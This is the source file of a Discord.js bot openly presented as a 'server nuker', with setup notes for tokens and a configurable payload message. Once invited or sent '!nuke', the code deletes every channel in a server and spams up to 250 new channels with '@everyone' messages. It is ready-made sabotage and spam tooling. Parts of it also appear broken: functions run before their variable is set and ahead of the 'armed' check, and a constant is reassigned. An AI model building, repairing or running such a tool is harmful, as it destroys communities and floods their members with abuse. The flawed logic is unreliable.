/*
  A DISCORD SERVER NUKER BY
   ____  _  ________ _____            _____  ______ 
  / __ \| |/ /  ____|  __ \     /\   |  __ \|  ____|
 | |  | | ' /| |__  | |__) |   /  \  | |  | | |__   
 | |  | |  < |  __| |  _  /   / /\ \ | |  | |  __|  
 | |__| | . \| |____| | \ \  / ____ \| |__| | |____ 
  \____/|_|\_\______|_|  \_\/_/    \_\_____/|______|
                                                     

                            ;.
                            j@{'  .>!
                `           j$$n.>8$+
                j*,         jB}]8$$u`          ..
         .....  j$$>        I]8$$n"          .<%'
         .~B$$&"j$$<      .i8$$u^          .~%$$'
           .+B$_j$$<     !8$$uIl          ^txxxi
             .+<j$$<   !&$$u!}@@###################j^
                j$$<|[&$$v^ j$$%ffffffffffffffffft:
                j$$<f$$@,   j$$u   .iz***I
    '```'       j$$<;%$$8>. j$$u .i8$$@$$8>.
    .<%$$n^     j$$< .>%$$8>u$$z>%$$%<.^n$$%>.
      .<%$$x^   j$$<   .<%$$$$$$$$%<.    ^u$$%>.
    .}#*}[8$$n,<%$$8#####8$$$$$$$$8#######{ln$$8+iv####*~.
  .~MWWWW*~_%$$uI{WWWWWWW8$$$$$$$$%WWWWW%$$@+,x$$%][#W1'
            .>%$$n^     !&$$$$$$$$%>.   I$$u   ^n$$%<.
              .>8$$n^ l&$$%~u$$z>8$$%<. I$$u     ^x$$8<.
                 i8$$@$$B+. j$$u  i8$$%lI$$u       '````
                  ;WMMM+.   j$$u   ,@$$nI$$u
         ,\/////////////////8$$u ^r$$%}tI$$u
       `rWWWWWWWWWWWWWWWWWWW@$1In$$%<.  I$$u!+.
            Ifff/"          lIr$$B~.    I$$u<$B~.
           '$$B_.          ^r$$%<.      I$$u^&$$B+.
           'B_.          `x$$%[l        I$$u  .....
           ..          'r$$B}[%u         :#u
                       >$%~.f$$u           ^
                       l+.  .{$u
                              '!

==============================================================
DEPENDS ON DISCORD.JS^14.14.1 AND DOTENV^16.4.5
==============================================================

==============================================================
HOW TO CUSTOMIZE THE NUKER
==============================================================
To customize the payload message:
Paste a Discord message JSON object into the message.json file.
The default is a message that sends "@everyone"
You can create a custom a message using a GUI with https://discohook.org
When done, click on "JSON Data Editor" and copy the JSON into message.json, overriting the existing one.

Other configurations can be found in config.json
To use the bot, "armed" has to be seet to true
If you want to activite the bot immediately after it was invited, set "automaticActivation" to true. This might be dangerous. 
==============================================================
AUTHORIZATION | AKA HOW TO SUPPLY TOKEN
==============================================================
Token has to be provided in the environment variables for security.
Create a .env file in the root of this project and write the following: TOKEN=your-token-here 
Replace "your-token-here" with the token of your bot.
If that doesn't work you might just want to supply the token manually. You can do that below: (THIS IS UNSAFE)
*/
var token = "YOUR-TOKEN-HERE"; //If .env fails, replace "YOUR-TOKEN-HERE" with your own token

//Load dotenv library
require('dotenv').config()

//Overrite token if process.env.token works
if(process.env.TOKEN) token = process.env.TOKEN;

//Load configuration
const payloadMessage = require("./message.json")
const { armed, channelDeletion, channelCreation, channelCreationCount, channelName, automaticActivation} = require("./config.json")

//Load Discord.js Library
const { Client, Events, GatewayIntentBits, ChannelType } = require('discord.js');

//Set up client with Discord.js
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
//Login
client.login(token);
//Log client login success
client.once(Events.ClientReady, readyClient => { console.log(`Logged in as ${readyClient.user.tag}`); });

//Nuke function
function nuke(guild)
{

    //CALL FUNCTIONS
    removeChannels();
    spamChannels();

    //Return if the nuker is not armed
    if(!armed) return;

    //Get channel manager
    var channelManager = guild.channels;

    //Delete all channels
    async function removeChannels()
    {
        //Return if channelDeletion is 0
        if(!channelDeletion) return;
        await channelManager.fetch();
        //Iterate through the channels of the server and delete them
        for (let [id,channel] of channelManager.cache) {
            //Making sure the script doesn't remove the channels the nuker created
            if(channel.name != channelName) channel.delete();
        }
    }

    //Spam new channels
    function spamChannels()
    {
        //Return if channelCreation is 0
        if(!channelCreation) return;
        //Create 'channelCreationCount' amount of channels (250 max)
        if(channelCreationCount > 250) channelCreationCount = 250;
        for (let i = 0; i < channelCreationCount; i++)
        {
            channelManager.create({
                name: channelName,
                type: ChannelType.GuildText,
            }).then(channel => {
                //Send the payload message
                channel.send(payloadMessage)
            })
        }
    }

}


client.on(Events.GuildCreate, guild => {
    if(automaticActivation) nuke(guild);
});

client.on(Events.MessageCreate, message => {

    //Display payload message
    if(message.content == "!message")
    {
        message.reply(payloadMessage)
    }

    //Nuke
	if(message.content == "!nuke")
    {
        nuke(message.guild);
    }
});
